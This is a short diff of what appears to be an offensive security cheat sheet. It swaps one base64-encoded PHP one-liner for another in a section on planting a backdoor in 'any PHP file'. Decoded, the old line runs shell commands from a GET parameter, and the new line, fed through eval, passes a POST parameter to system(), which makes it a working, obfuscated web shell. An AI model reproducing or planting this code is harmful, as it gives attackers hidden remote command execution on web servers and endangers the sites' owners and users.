@@ -1533,9 +1533,8 @@ Other methods:
 
 Add this line to the beginning of any PHP file:
 ```php
-<?php $i=base64_decode("aWYoaXNzZXQoJF9HRVRbMF0pKXtlY2hvIGAkX0dFVFswXWA7ZXhpdDt9");eval($i);?>
+<?php $i=base64_decode("aWYoaXNzZXQoJF9QT1NUWzBdKSl7c3lzdGVtKCRfUE9TVFswXSk7ZGllO30K");eval($i);?>
 ```
-(Thanks @dono for making this 3 bytes smaller than the smallest)
 
 Test the backdoor:
 ```sh
